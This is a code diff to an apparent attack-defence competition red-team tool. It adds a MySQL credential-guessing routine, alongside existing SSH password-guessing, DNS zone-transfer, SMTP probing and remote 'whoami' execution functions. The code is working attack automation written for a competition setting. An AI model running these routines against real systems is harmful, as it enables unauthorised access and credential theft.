@@ -19,6 +19,8 @@ from .utils import limited_credentials
 logger = logging.getLogger(__name__)
 fake = Faker()
 
+PwnResult = Tuple[str, bool, bool]
+
 
 def _get_ssh_client():
     ssh = paramiko.SSHClient()
@@ -27,7 +29,7 @@ def _get_ssh_client():
 
 
 def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
-            limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
+            limit_creds: LimitCreds, context: PostContext) -> PwnResult:
     ssh = _get_ssh_client()
 
     working = set()
@@ -51,7 +53,7 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
             with ssh:
                 logger.debug("Attempting {} with creds: {}".format(url, cred))
                 ssh.connect(url, port=port, username=credential.username, password=credential.password,
-                            look_for_keys=False, allow_agent=False)
+                            look_for_keys=False, allow_agent=False, timeout=60)
                 cred.state = Credential.WORKS
 
                 # Root doesn't need sudo
@@ -100,8 +102,45 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
         return 'Authentication failed', False, False
 
 
+def pwn_mysql(url: str, port: int, service: Service, flag_conf: FlagConf,
+              limit_creds: LimitCreds, context: PostContext) -> PwnResult:
+    import mysql.connector
+
+    working = set()
+    credentials = limited_credentials(limit_creds)
+    context.update({
+        'credentials': credentials,
+    })
+
+    for credential in credentials:
+        # Govern if necessary (and enabled)
+        gov = Governor.get_instance()
+        gov.attempt(gov.resolve_url(url))
+
+        try:
+            cred = credential.credentials.where(Credential.service == service).get()
+        except Credential.DoesNotExist:
+            cred = Credential.create(service=service, state=Credential.REJECT, bag=credential)
+
+        try:
+            logger.debug("Attempting {} with creds: {}".format(url, cred))
+            mysql.connector.connect(host=url, port=port, user=credential.username, passwd=credential.password)
+            cred.state = Credential.WORKS
+            cred.save()
+            working.add(cred)
+        except mysql.connector.errors.InterfaceError as e:
+            return f"Unable to connect: {e}", False, False
+        except Exception:
+            logger.exception("There was an error pwning this service: %s", url)
+
+    if working:
+        return "Found credentials: {}".format(working), True, False
+    else:
+        return 'Authentication failed', False, False
+
+
 def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
-            limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
+            limit_creds: LimitCreds, context: PostContext) -> PwnResult:
     try:
         z = dns.zone.from_xfr(dns.query.xfr(url, service.team.domain))
         names = z.nodes.keys()
@@ -110,6 +149,8 @@ def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
             DNSResult.get_or_create(team=service.team, name=name.to_text(), record=record.to_text(name))
     except DNSException:
         return 'Unable to AXFR', False, False
+    except ConnectionRefusedError:
+        return 'Unable to connect: refused', False, False
     except:
         logger.exception('Cannot connect to DNS for AXFR')
         return 'Unable to connect', False, False
@@ -118,7 +159,7 @@ def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
 
 
 def pwn_smtp(url: str, port: int, service: Service, flag_conf: FlagConf,
-             limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
+             limit_creds: LimitCreds, context: PostContext) -> PwnResult:
     try:
         with SMTP(url, port=port) as smtp:
             smtp.helo(fake.hostname())
@@ -135,7 +176,7 @@ def pwn_smtp(url: str, port: int, service: Service, flag_conf: FlagConf,
 
 
 def pwn_api_exec(url: str, port: int, service: Service, flag_conf: FlagConf,
-                 limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
+                 limit_creds: LimitCreds, context: PostContext) -> PwnResult:
     try:
         resp = requests.post(f"http://{url}/api/exec", {'command': 'whoami'}, verify=False)
         if resp.status_code == 200:
@@ -154,4 +195,5 @@ PWN_FUNCS = {
     'dns': pwn_dns,
     'smtp': pwn_smtp,
     'http': pwn_api_exec,
+    'mysql': pwn_mysql,
 }
